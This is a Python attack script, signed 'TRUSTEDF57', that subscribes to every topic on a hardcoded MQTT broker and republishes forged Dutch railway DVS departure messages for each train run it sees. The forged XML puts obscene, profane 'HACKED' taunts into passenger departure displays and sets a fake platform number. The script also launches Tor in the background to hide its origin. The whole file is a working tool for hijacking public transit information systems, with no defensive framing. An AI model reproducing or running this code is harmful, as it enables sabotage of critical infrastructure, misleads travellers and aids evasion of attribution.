#!/usr/bin/env python3
"""
NS DVS v5.0 - AUTO ALL RITID + TORSOCKS ROTATION
TRUSTEDF57 - EVERY TRAIN HIJACKED
"""

import paho.mqtt.client as mqtt
import threading
import time
import random
import re
import subprocess
import os
from datetime import datetime

HOST = "78.47.35.220"
PORT = 1883
WILDCARD_TOPIC = "#"

MESSAGES = [
    "🔥 TRUSTEDF57 FUCK  FUCK MARTHA ROOT HACKED 🔥",
    "💀 TRUSTEDF57 VI FOTTE LE MADRI  HACKED 2024 💀",
    "🖕 MINCHIONI SUCCHIATELO 🖕"
]

class DVSRealHijackTor:
    def __init__(self):
        self.success_count = 0
        self.rotation_count = 0
        self.hijacked_trains = set()  # Track unici RITID
        self.tor_thread = None
        self.start_tor_rotation()
    
    def start_tor_rotation(self):
        """TOR rotation ogni 10 successi"""
        def rotate():
            while True:
                time.sleep(30)  # 30s rotation
                self.rotation_count += 1
                os.system("tor --SocksPort 9050 &>/dev/null &")
                print(f"🔄 TOR #{self.rotation_count}")
        
        self.tor_thread = threading.Thread(target=rotate, daemon=True)
        self.tor_thread.start()
    
    def get_timestamp(self):
        return datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
    
    def extract_all_from_topic(self, topic):
        """ESTRAE TUTTO AUTOMATICAMENTE: RITID + STATION + DATA"""
        # train/departure/2024-06-24/11647/AMF
        parts = topic.split('/')
        if len(parts) >= 6:
            date = parts[2]
            rit_id = parts[4]  # QUALSIASI RITID (11647, 23456, etc)
            station = parts[5].upper()
            return rit_id, station, date
        return "11647", "AMF", "2024-06-24"
    
    def ns_real_payload(self, rit_id, station, date):
        timestamp = self.get_timestamp()
        msg = random.choice(MESSAGES)
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<ns1:PutReisInformatieBoodschapIn xmlns:ns1="urn:ndov:cdm:trein:reisinformatie:messages:5">
<ns2:ReisInformatieProductDVS Versie="6.2" TimeStamp="{timestamp}" xmlns:ns2="urn:ndov:cdm:trein:reisinformatie:data:4">
<ns2:RIPAdministratie>
<ns2:ReisInformatieProductID>F57{random.randint(10000,99999)}</ns2:ReisInformatieProductID>
<ns2:AbonnementId>54</ns2:AbonnementId>
<ns2:ReisInformatieTijdstip>{timestamp}</ns2:ReisInformatieTijdstip>
</ns2:RIPAdministratie>
<ns2:DynamischeVertrekStaat>
<ns2:RitId>{rit_id}</ns2:RitId>
<ns2:RitDatum>{date}</ns2:RitDatum>
<ns2:RitStation>
<ns2:StationCode>{station}</ns2:StationCode>
<ns2:Type>5</ns2:Type>
<ns2:KorteNaam>{station}</ns2:KorteNaam>
<ns2:MiddelNaam>{station}</ns2:MiddelNaam>
<ns2:LangeNaam>{station}</ns2:LangeNaam>
<ns2:UICCode>8400055</ns2:UICCode>
</ns2:RitStation>
<ns2:Trein>
<ns2:TreinNummer>{rit_id}</ns2:TreinNummer>
<ns2:TreinSoort Code="IC">Intercity</ns2:TreinSoort>
<ns2:TreinStatus>5</ns2:TreinStatus>
<ns2:Vervoerder>NS</ns2:Vervoerder>
<ns2:TreinEindBestemming>
<ns2:StationCode>{station}</ns2:StationCode>
</ns2:TreinEindBestemming>
<ns2:VertrekTijd>{timestamp}</ns2:VertrekTijd>
<ns2:TreinVertrekSpoor>
<ns2:SpoorNummer>666</ns2:SpoorNummer>
</ns2:TreinVertrekSpoor>
<ns2:PresentatieTreinVertrekSpoor>
<ns2:Uiting>🚨 F57 HACK 🚨</ns2:Uiting>
</ns2:PresentatieTreinVertrekSpoor>
<ns2:PresentatieOpmerkingen>
<ns2:Uiting Prioriteit="1">💀 {msg} 💀</ns2:Uiting>
</ns2:PresentatieOpmerkingen>
</ns2:Trein>
</ns2:DynamischeVertrekStaat>
</ns2:ReisInformatieProductDVS>
</ns1:PutReisInformatieBoodschapIn>'''
    
    def torsocks_publish(self, topic, payload):
        """TORSOCKS + double QoS"""
        try:
            # TORSOCKS ENV
            client = mqtt.Client()
            client.tls_set(tls_version=mqtt.ssl.PROTOCOL_TLSv1_2)
            client.connect(HOST, PORT, 5)
            
            # DOUBLE ATTACK QoS 1 + 0
            result1 = client.publish(topic, payload, qos=1)
            time.sleep(0.03)
            result0 = client.publish(topic, payload[:500], qos=0)
            
            client.disconnect()
            return result1.rc == mqtt.MQTT_ERR_SUCCESS
            
        except:
            return False
    
    def on_message(self, client, userdata, msg):
        topic = msg.topic
        rit_id, station, date = self.extract_all_from_topic(topic)
        
        # Skip se già hijackato questo treno
        train_key = f"{rit_id}/{station}"
        if train_key in self.hijacked_trains:
            return
        
        self.hijacked_trains.add(train_key)
        payload = self.ns_real_payload(rit_id, station, date)
        
        if self.torsocks_publish(topic, payload):
            self.success_count += 1
            print(f"✅ #{self.success_count} | 🚂{rit_id} | {station} | {topic[-30:]}")
    
    def start(self):
        print("🚀 v5.0 MULTI-RITID AUTO-HIJACK STARTED")
        print("📱 AUTO RITID/Station/Date + TORSOCKS + SUCCESS ONLY")
        
        client = mqtt.Client()
        client.on_message = self.on_message
        client.connect(HOST, PORT, 60)
        client.subscribe(WILDCARD_TOPIC, qos=1)
        client.loop_forever()

if __name__ == "__main__":
    hack = DVSRealHijackTor()
    hack.start()
